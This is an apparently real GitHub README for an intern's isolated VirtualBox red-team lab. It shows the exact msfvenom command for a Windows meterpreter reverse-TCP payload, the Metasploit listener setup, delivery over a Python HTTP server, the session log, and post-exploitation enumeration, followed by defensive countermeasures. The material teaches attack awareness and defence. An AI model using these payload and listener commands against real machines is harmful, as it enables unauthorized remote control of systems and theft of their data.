# RedTeam-Basics (Shell-Access lab)

### Cybersecurity Internship Program | Intermediate Task

> *"To defend against an attack, you must first understand how it works."*

---

## ETHICAL USE DISCLAIMER

> **This project was conducted exclusively for educational purposes as part of a structured cybersecurity internship program.**
>
> - All activities were performed in a **fully isolated virtual lab environment** (VirtualBox)
> -  **No real systems, networks, or devices** were targeted, accessed, or harmed
> -  Both machines (attacker + target) were **personally owned virtual machines**
> -  This documentation is shared to **demonstrate red team awareness** and promote defensive security knowledge
>
> - The author assumes no responsibility for misuse.

---

## Project Overview

**RedTeam-Basics** is a documented red team lab exercise demonstrating how a reverse shell payload is created, delivered, and used to gain remote access to a Windows 10 machine — all within a controlled, isolated environment.

The goal is to **think like an attacker in order to build better defenses** — a core principle of ethical hacking and penetration testing.

| Detail | Info |
|--------|------|
|  **Intern** | Cleveland Henry Lore |
|  **Date** | March 11, 2026 |
|  **Program** | Cybersecurity Internship — Intermediate Task |
|  **Attacker OS** | Kali Linux (root@vbox) |
|  **Target OS** | Windows 10 Pro — Build 19045 |
|  **Tool** | Metasploit Framework |
|  **Payload** | `windows/x64/meterpreter/reverse_tcp` |
|  **Network** | Isolated VirtualBox lab (Bridged Adapter) |

---

##  Lab Environment
```
┌─────────────────────────────────────────────────────┐
│                  VirtualBox Host                    │
│                                                     │
│  ┌──────────────────┐    ┌───────────────────────┐  │
│  │   Kali Linux     │    │    Windows 10 Pro     │  │
│  │  (Attacker/C2)   │◄──►│      (Target)         │  │
│  │  192.168.0.100   │    │   192.168.0.105        │  │
│  │  root@vbox       │    │   DESKTOP-GJQ08PV     │  │
│  └──────────────────┘    └───────────────────────┘  │
│                                                     │
│            [Isolated — No External Access]          │
└─────────────────────────────────────────────────────┘
```

---

## Repository Structure
```
RedTeam-Basics/
│
├── README.md
├── reports/
│   └── Cleveland_Henry_Lore_Intermediate_Task_Report.docx
├── screenshots/
│   ├── payload_created.png
│   ├── msf1.png
│   ├── msf2.png
│   ├── msf3.png
│   ├── msf4.png
│   ├── msf5.png
│   ├── msf6.png
│   ├── msf7.png
│   ├── msf8.png
│   ├── msf9.png
│   └── msf10.png
└── notes/
    └── commands_used.md
```

---

## ⚙️ Tools Used

| Tool | Purpose | Version |
|------|---------|---------|
| VirtualBox | Virtualization platform | Latest |
| Kali Linux | Attacker OS with Metasploit | Rolling |
| Metasploit Framework | Exploit framework + listener | v6.4.50-dev |
| msfvenom | Payload generator | Built into Metasploit |
| Python 3 | File delivery HTTP server | 3.x |
| Windows 10 ISO | Target virtual machine | Build 19045 |

---

##  Attack Phases

### Phase 1 — Payload Creation
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.0.100 \
  LPORT=4444 \
  -f exe \
  -o virus.exe
```

### Phase 2 — Listener Setup
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.100
set lport 4444
run
```

### Phase 3 — Payload Delivery
```bash
python3 -m http.server 8080
# Downloaded on Windows VM via browser at http://192.168.0.100:8080
```

### Phase 4 — Shell Obtained 
```
[*] Started reverse TCP handler on 192.168.0.100:4444
[*] Sending stage (203846 bytes) to 192.168.0.105
[*] Meterpreter session 1 opened (192.168.0.100:4444 -> 192.168.0.105:40478)

meterpreter >
```

---

##  Post-Exploitation Evidence

### System Identity
```
C:\Users\User1> whoami
desktop-gjq08pv\user1

C:\Users\User1> hostname
DESKTOP-GJQ08PV
```

### System Info
```
OS Name:        Microsoft Windows 10 Pro
OS Version:     10.0.19045 Build 19045
System Model:   HP ProBook 4330s
Processor:      Intel64 Family 6 ~2401 MHz
Total RAM:      12,222 MB
Time Zone:      (UTC+03:00) Nairobi
```

### User Accounts Discovered
```
Administrator    DefaultAccount    Guest
User1            WDAGUtilityAccount
```

### Network Configuration
```
Wi-Fi Adapter:
  IPv4 Address:    192.168.0.105
  Subnet Mask:     255.255.255.0
  Default Gateway: 192.168.0.1
```

---

##  Screenshots

### Payload Created
![Payload Created](/Screenshots/payload_created.png)

### Meterpreter Session Opened
![Session Opened](/Screenshots/msf1.png)

### Shell Access — whoami
![whoami](/Screenshots/msf2.png)

### Network Configuration — ipconfig
![ipconfig](/Screenshots/msf3.png)

### Systeminfo Output
![systeminfo](/Screenshots/msf6.png)

### File System Browsing
![File System](/Screenshots/msf10.png)

---

##  Lessons Learned

### Attacker's Perspective
- A functional reverse shell can be created and deployed in minutes using Metasploit
- Python's built-in HTTP server is an effective, dependency-free file delivery method
- Once inside via Meterpreter, full system enumeration is trivial — users, files, network, processes

### Defender's Perspective
- **Windows Defender works** — the payload only ran after AV was disabled
- Outbound connections on port 4444 are a strong indicator of compromise
- Users should **never** run untrusted executables, regardless of source
- The biggest vulnerability here was **human behavior**, not a software flaw

---

##  Defensive Countermeasures

| Control | Defence Against This Attack |
|---|---|
| **Antivirus / EDR** | Detects and kills Meterpreter payloads |
| **Firewall Rules** | Block outbound on non-standard ports (4444) |
| **Application Whitelisting** | Prevent unsigned executables from running |
| **Network IDS/IPS** | Snort/Suricata detect Metasploit signatures |
| **User Awareness Training** | Prevent social engineering delivery |
| **Least Privilege** | Limit ability to disable AV or run executables |
| **Email/Web Filtering** | Block .exe downloads at the perimeter |
| **SIEM Logging** | Centralized detection of suspicious behavior |

---

##  Full Report

 [`reports/Cleveland_Henry_Lore_Intermediate_Task_Report.docx`](Report/Cleveland_Henry_Lore_Intermediate_Task_Report.docx)

---

## 👤 Author

**Cleveland Henry Lore**
Cybersecurity Internship Program — Intermediate Task
March 11, 2026 

---

##  License

This project is for **educational and portfolio purposes only**.
All lab activities were conducted in an isolated environment with no harm to real systems.
```
 FOR EDUCATIONAL USE ONLY
 Unauthorized use of these techniques against real systems is illegal.
```
